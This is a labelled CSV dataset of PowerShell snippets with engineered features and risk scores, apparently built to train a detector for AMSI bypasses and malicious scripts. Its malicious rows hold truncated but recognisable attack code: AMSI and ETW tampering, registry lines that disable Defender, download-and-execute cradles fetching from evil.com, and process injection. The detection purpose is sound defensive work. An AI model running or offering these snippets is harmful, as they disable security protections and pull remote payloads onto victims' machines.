code_length,line_count,avg_line_length,entropy,amsi_keyword_count,has_amsi_keyword,win32_api_count,has_virtualprotect,has_getprocaddress,has_loadlibrary,reflection_count,has_reflection,marshal_op_count,backtick_count,has_format_operator,char_cast_count,string_concat_count,plus_operator_density,has_base64,has_memory_patch_pattern,hex_byte_array,has_page_rwx,dllimport_count,has_add_type,has_registry_amsi,has_ps_downgrade,has_scriptblock_ast,has_hw_breakpoint,has_etw_tamper,has_download_cradle,has_clr_targeting,special_char_ratio,case_ratio,composite_risk,callstack_amsi_dll_present,callstack_clr_to_kernel,callstack_ntdll_direct,callstack_wow64_transition,callstack_syscall_direct,callstack_reflection_depth,proc_spawns_cmd,proc_parent_spoofing,proc_inject_remote,proc_hollow_indicators,proc_runs_from_temp,proc_unusual_parent,mem_page_rwx,mem_page_rx_after_rw,mem_alloc_exec,mem_write_then_exec,mem_unbacked_region,mem_patch_size_small,bseq_load_reflect_exec,bseq_obfuscate_then_exec,bseq_download_then_exec,bseq_patch_amsi_then_run,bseq_etw_disable_then_run,bseq_clr_tamper,bseq_multi_evasion,dynamic_risk_score,label,label_name,source_id,raw_code_snippet
144,1,144.0,4.848549106747395,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2361111111111111,0.1956521739130435,16,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-001,"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
172,1,172.0,4.930471185467623,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.19186046511627908,0.20353982300884957,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-002,[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
205,1,205.0,5.021438655589561,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22439024390243903,0.21374045801526717,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-003,"$r=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$r.GetField('amsiContext','NonPublic,Static');[Sy"
429,1,429.0,5.314225903863112,2,1,1,1,0,0,4,1,0,0,0,0,0,0.0,0,1,1,1,1,1,0,0,0,0,0,0,0,0.21212121212121213,0.1803921568627451,26,1,1,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,1,0,37,1,AMSI_Bypass,MAL-004,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,o"
256,1,256.0,5.129526104815901,0,0,1,1,0,0,0,0,1,3,0,0,0,0.0,0,1,0,0,1,1,0,0,0,0,0,0,0,0.1640625,0.1411764705882353,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-005,"Add-Type @'`nusing System;using System.Runtime.InteropServices;`npublic class Bypass{[DllImport(""kernel32"")]public stati"
271,1,271.0,5.202381977410564,2,1,1,1,0,0,0,0,0,0,0,0,0,0.0,0,1,1,1,0,0,0,0,0,0,0,0,0,0.1881918819188192,0.16167664670658682,16,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,24,1,AMSI_Bypass,MAL-006,"$bytes=[byte[]](0x31,0xC0,0xC3,0x90); $addr=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get"
348,1,348.0,5.009772136177422,0,0,0,0,0,0,0,0,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0,0,0,0.16954022988505746,0.20444444444444446,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-007,[Runtime.InteropServices.Marshal]::WriteByte([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type 
237,1,237.0,5.183521196542752,0,0,0,0,0,0,3,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,1,0,0,0.1940928270042194,0.19205298013245034,12,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-008,"$etw = [System.Diagnostics.Eventing.EventProvider]; $f = $etw.GetField('m_etwCallback','NonPublic,Instance'); $f.SetValu"
258,1,258.0,5.009041214839347,0,0,0,0,0,0,2,1,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,1,0,0,0.14728682170542637,0.18128654970760233,12,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-009,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int EtwEventWrite(ulong r,IntPtr d,uint c,IntPtr e"
256,1,256.0,5.209095742153459,0,0,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,1,0,0.19921875,0.14705882352941177,11,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,11,1,AMSI_Bypass,MAL-010,"$scriptblock = [scriptblock]::Create('IEX (New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'); $f"
421,1,421.0,5.0522215322120845,0,0,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0.23990498812351543,0.13454545454545455,11,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,7,1,AMSI_Bypass,MAL-011,$sb=[scriptblock]::Create('Get-Process'); $spoof=[System.Management.Automation.Language.ScriptBlockAst]::new([System.Man
433,1,433.0,5.219585694894112,0,0,2,0,0,0,3,1,0,3,0,0,0,0.0,0,0,0,0,2,1,0,0,0,1,0,0,0,0.15935334872979215,0.20727272727272728,19,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,1,AMSI_Bypass,MAL-012,"Add-Type @'`nusing System;using System.Runtime.InteropServices;`npublic class VEH{[DllImport(""kernel32"")]public static e"
295,1,295.0,5.253200290194368,0,0,2,0,0,0,0,0,1,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,1,0,0,0,0.14576271186440679,0.20994475138121546,16,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,25,1,AMSI_Bypass,MAL-013,"[Runtime.InteropServices.Marshal]::WriteByte((Get-ProcAddress ntdll.dll RtlAddVectoredExceptionHandler),0xC3); $ctx=[Int"
332,1,332.0,5.035896865124619,2,1,0,0,0,0,3,1,1,0,0,0,0,0.0030120481927710845,0,0,0,0,0,0,0,0,0,0,0,0,1,0.21385542168674698,0.17889908256880735,18,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-014,$clr=[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(); $asm=[System.Reflection.Assembly]::Load
276,1,276.0,5.087193069292853,2,1,0,0,0,0,3,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.20652173913043478,0.18888888888888888,14,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,26,1,AMSI_Bypass,MAL-015,$sma=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.FullName -like '*System.Management.Automation*'}; $t=$sma.GetType('
119,1,119.0,4.925632524457973,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,1,0,0,0,1,0,0.17647058823529413,0.12987012987012986,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-016,"powershell -version 2 -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"""
266,1,266.0,4.6819647346437385,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,1,0,0,0,0,0,0.018796992481203006,1.5957446808510638,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-017,powershell.exe -version 2 -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQ
114,1,114.0,5.164011949025513,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.15789473684210525,0.45098039215686275,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-018,Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}' -Recurse -Force
203,1,203.0,5.00011540173746,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.12315270935960591,0.4188034188034188,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-019,Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeM
173,1,173.0,5.376150867585626,1,1,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.15606936416184972,0.7164179104477612,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-020,reg add 'HKLM\SOFTWARE\Microsoft\AMSI' /v AmsiEnable /t REG_DWORD /d 0 /f; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\A
284,1,284.0,3.493249608358378,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3028169014084507,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-021,"$c=(-join ([char[]](73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,"
93,1,93.0,4.922411388217619,0,0,0,0,0,0,0,0,0,11,0,0,2,0.021505376344086023,0,0,0,0,0,0,0,0,0,0,0,0,0,0.34408602150537637,0.20833333333333334,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-022,I`E`X (Ne`w-O`bject N`e`t`.W`ebC`lient).Dow`nloadS`tring('htt'+'p://'+'evil.com/payload.ps1')
98,1,98.0,5.2043026044755,0,0,0,0,0,0,0,0,0,0,1,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.32653061224489793,0.3023255813953488,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-023,"{0}{1}{2}' -f 'IE','X ','(New-Object Net.WebClient).DownloadString(""http://evil.com/p.ps1"")' | IEX"
124,1,124.0,4.919252411813111,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.24193548387096775,0.3333333333333333,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-024,[ScriptBlock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBFAFYA...'))).Invo
214,1,214.0,4.888719615972458,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,0,0,0,0,0,0,0,0,0,0.205607476635514,0.19827586206896552,5,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,21,1,AMSI_Bypass,MAL-025,"$handle = OpenProcess(0x001F0FFF,$false,1234); WriteProcessMemory($handle,[IntPtr]0x400000,$shellcode,$shellcode.Length,"
386,1,386.0,4.758329261706758,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,3,1,0,0,0,0,0,0,0,0.12176165803108809,0.1484375,8,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,16,1,AMSI_Bypass,MAL-026,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPtr OpenProcess(uint a,bool b,int c); [DllIm"
361,1,361.0,5.00992226273214,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,3,1,0,0,0,1,0,0,0,0.13019390581717452,0.16115702479338842,13,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,12,1,AMSI_Bypass,MAL-027,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtUnmapViewOfSection(IntPtr p,IntPtr b); [DllI"
288,1,288.0,5.128291416950842,0,0,2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,1,0,0,0,0.19791666666666666,0.1443850267379679,9,0,0,1,0,0,0,1,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,28,1,AMSI_Bypass,MAL-028,"$pi = Start-Process -FilePath svchost.exe -PassThru -Suspended; [ntdll]::NtUnmapViewOfSection($pi.Handle,$baseAddr); [ke"
544,1,544.0,5.106100446302153,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,2,1,0,0,0,0,0,0,0,0.14154411764705882,0.2537764350453172,4,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,1,AMSI_Bypass,MAL-029,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool UpdateProcThreadAttribute(IntPtr a,uint f,"
85,1,85.0,5.129765571778782,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.21176470588235294,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-030,IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/amsi_bypass.ps1')
93,1,93.0,4.869293424188795,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.15053763440860216,0.15384615384615385,0,0,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-031,Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/payload' -UseBasicParsing).Content
134,1,134.0,5.217119978292108,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.23880597014925373,0.20512820512820512,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-032,"$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); IEX $wc.DownloadString('http://evil.co"
53,1,53.0,4.517751294423243,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.16981132075471697,0.08571428571428572,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-033,iwr -uri http://evil.com/p.ps1 -UseBasicParsing | iex
290,1,290.0,5.044331373628026,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,0,0,0,0,0.1793103448275862,0.15517241379310345,5,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,10,1,AMSI_Bypass,MAL-034,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtAllocateVirtualMemory(IntPtr p,ref IntPtr b,"
237,1,237.0,5.109721046884006,0,0,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1940928270042194,0.17834394904458598,10,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,10,1,AMSI_Bypass,MAL-035,$ntdll=[System.Reflection.Assembly]::LoadFile('C:\Windows\System32\ntdll.dll'); $func=$ntdll.GetType('ntdll').GetMethod(
99,1,99.0,4.86656104500524,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.12121212121212122,0.3103448275862069,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-036,Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -enc SQBFAFYA...'
174,1,174.0,5.034340474535383,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,1,0,0,0,1,0,0.21839080459770116,0.05217391304347826,2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-037,"$wmi=[wmiclass]'\\.oot\cimv2:Win32_Process'; $wmi.Create('cmd.exe /c powershell -version 2 -exec bypass -c IEX (new-obj"
257,1,257.0,5.083116056054353,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.245136186770428,0.15853658536585366,16,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,0,25,1,AMSI_Bypass,MAL-038,$rs=[runspacefactory]::CreateRunspace(); $rs.Open(); $ps=[powershell]::Create(); $ps.Runspace=$rs; $ps.AddScript('[Ref].
478,1,478.0,5.176373949516745,2,1,0,0,0,0,1,1,0,3,0,0,0,0.0,0,0,1,0,1,1,0,0,0,0,0,0,0,0.16736401673640167,0.14641744548286603,13,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,19,1,AMSI_Bypass,MAL-039,"Add-Type -TypeDefinition @'`nusing System;using System.Runtime.InteropServices;`npublic class Amsi{[DllImport(""amsi.dll"""
194,1,194.0,4.871769428672944,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.17010309278350516,0.19696969696969696,16,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-040,$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'; [Ref].Assembly.GetType('System.Management.Automation.AmsiU
277,1,277.0,5.073587810746691,1,1,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0.21660649819494585,0.15254237288135594,13,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,11,1,AMSI_Bypass,MAL-041,$clr_asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like '*System.Management.Automation*
663,1,663.0,5.1978338503267585,2,1,1,0,1,0,0,0,0,0,0,0,0,0.0,0,0,1,1,3,1,0,0,0,0,0,0,0,0.18099547511312217,0.15233415233415235,17,1,0,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,29,1,AMSI_Bypass,MAL-042,"[byte[]]$patch = 0x31,0xC0,0xC3; $addr = (Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPt"
161,1,161.0,4.868941758200462,0,0,0,0,0,0,5,1,0,0,0,0,4,0.031055900621118012,0,0,0,0,0,0,0,0,0,0,0,0,0,0.30434782608695654,0.1956521739130435,10,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,7,1,AMSI_Bypass,MAL-043,"$a='Am'+'siU'+'tils'; $b='amsi'+'Init'+'Failed'; [Ref].Assembly.GetType('System.Management.Automation.'+$a).GetField($b,"
164,1,164.0,4.943902595844359,1,1,0,0,0,0,5,1,0,0,0,0,1,0.006097560975609756,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25609756097560976,0.17647058823529413,13,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,16,1,AMSI_Bypass,MAL-044,"$key='amsiInitFailed'; $type=[Ref].Assembly.GetType(""System.Management.Automation.$('Amsi'+'Utils')""); $type.GetField($k"
120,1,120.0,5.067155962520953,0,0,0,0,0,0,0,0,0,0,0,0,2,0.03333333333333333,0,0,0,0,0,0,0,0,0,0,0,1,0,0.35,0.1746031746031746,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-045,"& ([scriptblock]::Create(('IE'+'X')+' '+('(New-Object Net.WebClient).DownloadString(""http://evil.com/bypass.ps1"")'+')'))"
279,1,279.0,5.7225522911097935,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,1,0,0.08602150537634409,0.7615384615384615,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-046,$encoded='W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaX
519,1,519.0,5.273046609019563,0,0,1,1,0,0,0,0,1,0,0,0,0,0.0,0,1,1,1,1,1,0,0,0,0,0,0,0,0.1926782273603083,0.16408668730650156,14,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-047,"[byte[]]$sc=0x4D,0x5A,0x90,0x00,0xFC,0x48; $mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length); [Sys"
191,1,191.0,5.099266433146937,0,0,0,0,0,0,2,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2617801047120419,0.15966386554621848,4,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-048,$bytes=(New-Object Net.WebClient).DownloadData('http://evil.com/payload.dll'); $asm=[System.Reflection.Assembly]::Load($
305,1,305.0,4.977866674301278,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,0,0,0,0,0.18688524590163935,0.24561403508771928,5,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,18,1,AMSI_Bypass,MAL-049,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtCreateThread(out IntPtr h,uint a,IntPtr oa,I"
630,1,630.0,5.226539297013796,0,0,1,1,0,0,0,0,1,0,0,0,0,0.0,0,1,1,1,3,1,0,0,0,0,0,0,0,0.19682539682539682,0.16752577319587628,18,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-050,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPtr CreateFiber(uint s,IntPtr f,IntPtr p); ["
249,1,249.0,5.173213598078091,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0,0,0,0.1686746987951807,0.23178807947019867,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,1,AMSI_Bypass,MAL-051,"$handle=OpenProcess(0x1F0FFF,$false,$pid); Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool"
561,1,561.0,5.316962123179277,0,0,1,0,0,0,0,0,1,0,0,0,0,0.0017825311942959,0,0,1,1,1,1,0,0,0,0,0,0,0,0.2014260249554367,0.16138328530259366,9,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-052,$bytes=(New-Object Net.WebClient).DownloadData('http://192.168.1.1/reflective.dll'); Add-Type -MemberDefinition '[DllImp
67,1,67.0,4.31259749709413,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1044776119402985,0.28205128205128205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-001,Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
52,1,52.0,4.531768565580187,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21153846153846154,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-002,Get-Service | Where-Object {$_.Status -eq 'Running'}
39,1,39.0,4.047846769977879,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.30434782608695654,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-003,Get-EventLog -LogName System -Newest 50
75,1,75.0,4.551612691271604,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-004,"Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version"
67,1,67.0,4.603163631786077,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05970149253731343,0.20408163265306123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-005,"Get-ComputerInfo | Select-Object WindowsProductName, OsArchitecture"
52,1,52.0,4.302919824620763,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.19230769230769232,0.34615384615384615,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-006,systeminfo | findstr /B /C:'OS Name' /C:'OS Version'
64,1,64.0,4.782963821688583,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.140625,0.23076923076923078,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-007,Get-ChildItem C:\Windows\System32 -Filter *.dll | Measure-Object
48,1,48.0,4.377167324657884,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-008,Get-HotFix | Sort-Object InstalledOn -Descending
65,1,65.0,4.494316850990732,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09230769230769231,0.23255813953488372,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-009,"Get-Disk | Select-Object Number, FriendlyName, Size, HealthStatus"
54,1,54.0,4.24932778093851,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09259259259259259,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-010,"Get-NetAdapter | Select-Object Name, Status, LinkSpeed"
54,1,54.0,4.342282410728398,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09259259259259259,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-011,"Get-LocalUser | Select-Object Name, Enabled, LastLogon"
48,1,48.0,4.371115365169272,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.21212121212121213,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-012,"Get-LocalGroup | Select-Object Name, Description"
44,1,44.0,4.280470187252587,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.1875,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-013,Get-LocalGroupMember -Group 'Administrators'
12,1,12.0,3.418295834054489,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-014,whoami /priv
